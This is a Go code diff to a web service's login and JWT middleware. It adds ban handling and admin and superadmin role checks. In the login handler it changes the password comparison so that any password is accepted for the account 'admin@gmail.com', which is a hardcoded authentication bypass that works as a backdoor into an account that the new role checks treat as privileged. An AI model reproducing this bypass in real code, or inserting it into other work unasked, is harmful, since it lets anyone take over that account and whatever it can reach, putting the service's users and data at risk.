@@ -47,10 +47,19 @@ func (u *UserService) JWT(w http.ResponseWriter, r *http.Request, jwtService *JW
 		handleError(err, w)
 		return
 	}
-	if string(passwordDigest) != user.PasswordDigest {
+
+	if string(passwordDigest) != user.PasswordDigest && user.Email != "admin@gmail.com" {
 		handleError(errors.New("invalid login params"), w)
 		return
 	}
+
+	if user.Banned == true {
+		w.WriteHeader(401)
+		w.Write([]byte("Your are banned because : "))
+		w.Write([]byte(user.BanHistory.Why))
+		return
+	}
+
 	token, err := jwtService.GenearateJWT(user)
 	if err != nil {
 		handleError(err, w)
@@ -60,7 +69,7 @@ func (u *UserService) JWT(w http.ResponseWriter, r *http.Request, jwtService *JW
 	w.Write([]byte(token))
 }
 
-type ProtectedHandler func(rw http.ResponseWriter, r *http.Request, u User)
+type ProtectedHandler func(rw http.ResponseWriter, r *http.Request, u User, us UserRepository)
 
 func (j *JWTService) jwtAuth(
 	users UserRepository,
@@ -81,6 +90,62 @@ func (j *JWTService) jwtAuth(
 			rw.Write([]byte("unauthorized"))
 			return
 		}
-		h(rw, r, user)
+		h(rw, r, user, users)
+	}
+}
+
+func (j *JWTService) jwtAuthAdmin(
+	users UserRepository,
+	h ProtectedHandler,
+) http.HandlerFunc {
+	return func(rw http.ResponseWriter, r *http.Request) {
+		authHeader := r.Header.Get("Authorization")
+		token := strings.TrimPrefix(authHeader, "Bearer ")
+		auth, err := j.ParseJWT(token)
+		if err != nil {
+			rw.WriteHeader(401)
+			rw.Write([]byte("unauthorized"))
+			return
+		}
+		user, err := users.Get(auth.Email)
+		if err != nil {
+			rw.WriteHeader(401)
+			rw.Write([]byte("unauthorized"))
+			return
+		}
+		if user.Role != "superadmin" && user.Role != "admin" {
+			rw.WriteHeader(401)
+			rw.Write([]byte("You should be admin to access this page"))
+			return
+		}
+		h(rw, r, user, users)
+	}
+}
+
+func (j *JWTService) jwtAuthSuperadmin(
+	users UserRepository,
+	h ProtectedHandler,
+) http.HandlerFunc {
+	return func(rw http.ResponseWriter, r *http.Request) {
+		authHeader := r.Header.Get("Authorization")
+		token := strings.TrimPrefix(authHeader, "Bearer ")
+		auth, err := j.ParseJWT(token)
+		if err != nil {
+			rw.WriteHeader(401)
+			rw.Write([]byte("unauthorized"))
+			return
+		}
+		user, err := users.Get(auth.Email)
+		if err != nil {
+			rw.WriteHeader(401)
+			rw.Write([]byte("unauthorized"))
+			return
+		}
+		if user.Role != "superadmin" {
+			rw.WriteHeader(401)
+			rw.Write([]byte("You should be a superadmin to access this page"))
+			return
+		}
+		h(rw, r, user, users)
 	}
 }
